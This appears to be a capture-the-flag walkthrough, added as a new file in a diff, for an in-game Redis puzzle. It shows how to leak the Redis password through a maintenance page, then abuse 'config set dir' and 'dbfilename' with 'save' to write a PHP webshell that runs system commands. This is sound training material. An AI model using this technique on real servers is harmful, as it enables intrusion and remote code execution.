@@ -1,0 +1,126 @@
+In-game terminal
+Objective: find the bug that stopped the server.
+Hints:
+  https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
+  https://lzone.de/cheat-sheet/Redis
+
+
+(Initial message)
+  Can you help me?
+
+  I was playing with my birdie (she's a Green Cheek!) in something called tmux,
+  then I did something and it disappeared!
+
+  Can you help me find her? We were so attached!!
+  We need your help!!
+
+  The server stopped working, all that's left is the maintenance port.
+
+  To access it, run:
+
+  curl http://localhost/maintenance.php
+
+  We're pretty sure the bug is in the index page. Can you somehow use the
+  maintenance page to view the source code for index.php?
+
+
+(Give the maintenance page a try.)
+~$ curl http://localhost/maintenance.php
+  ERROR: 'cmd' argument required (use commas to separate commands); eg:
+  curl http://localhost/maintenance.php?cmd=help
+  curl http://localhost/maintenance.php?cmd=mget,example1
+
+
+(Try the help command.)
+~$ curl http://localhost/maintenance.php?cmd=help
+  Running: redis-cli --raw -a '<password censored>' 'help'
+
+  redis-cli 5.0.3
+  To get help about Redis commands type:
+      "help @<group>" to get a list of commands in <group>
+      "help <command>" for help on <command>
+      "help <tab>" to get a list of possible help topics
+      "quit" to exit
+
+  To set redis-cli preferences:
+      ":set hints" enable online hints
+      ":set nohints" disable online hints
+  Set your preferences in ~/.redisclirc
+
+
+(Get list of active config variables.)
+~$ curl http://localhost/maintenance.php?cmd=config,get,*
+  Running: redis-cli --raw -a '<password censored>' 'config' 'get' '*'
+  dbfilename
+  dump.rdb
+  requirepass
+  R3disp@ss
+  masterauth
+  ...
+
+
+(R3disp@ss looks like a password we can use.)
+~$ redis-cli -a R3disp@ss -h localhost
+  Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
+
+
+(Trying the PHP Webshell by guessing the location of the website path.)
+localhost:6379> config set dir /var/www/html
+localhost:6379> config set dbfilename redis.php
+localhost:6379> set test "<?php echo 'CMD:'. system('ls -al');?>"
+localhost:6379> save
+localhost:6379> exit
+~$ curl http://localhost/redis.php --output - > test.txt
+~$ head test.txt
+  ...
+  drwx------ 1 www-data www-data 4096 Oct 12 01:53 .
+  drwxr-xr-x 1 root     root     4096 Oct  1  2021 ..
+  -rwx------ 1 www-data www-data  488 Oct 12 01:53 index.php
+  -rwx------ 1 www-data www-data  783 Sep 20  2021 maintenance.php
+  -rw-r--r-- 1 root     root      387 Oct 12 01:53 redis.php
+  ...
+
+
+(The breakdown of commands.)
+  save: forces everything to be saved to the dumpfile, this include the key values.
+  set test: sets the value of the key named test.
+  config set dbfilename: sets the name of the dumpfile.
+  config set dir: sets the location where the dumpfile will be created.
+
+
+(This puting the php code to run ls in a file accessible by curl.)
+(Since index.php is in the same website path, we can just cat the content of it.)
+(Leave in the ls -al command because it's easy to spot it.)
+~$ redis-cli -a R3disp@ss -h localhost
+localhost:6379> set test "<?php echo 'CMD:'. system('ls -al;cat index.php');?>"
+localhost:6379> save
+localhost:6379> exit
+~$ curl http://localhost/redis.php --output - > test.txt
+~$ head test.txt -100
+  ...
+  drwx------ 1 www-data www-data 4096 Oct 12 01:58 .
+  drwxr-xr-x 1 root     root     4096 Oct  1  2021 ..
+  -rwx------ 1 www-data www-data  488 Oct 12 01:53 index.php
+  -rwx------ 1 www-data www-data  783 Sep 20  2021 maintenance.php
+  -rw-r--r-- 1 root     root      401 Oct 12 01:58 redis.php
+  <?php
+  
+  # We found the bug!!
+  #
+  #         \   /
+  #         .\-/.
+  #     /\ ()   ()
+  #       \/~---~\.-~^-.
+  # .-~^-./   |   \---.
+  #      {    |    }   \
+  #    .-~\   |   /~-.
+  #   /    \  A  /    \
+  #         \/ \/
+  # 
+
+  echo "Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on"
+  ?>
+  ...
+
+
+Success!!
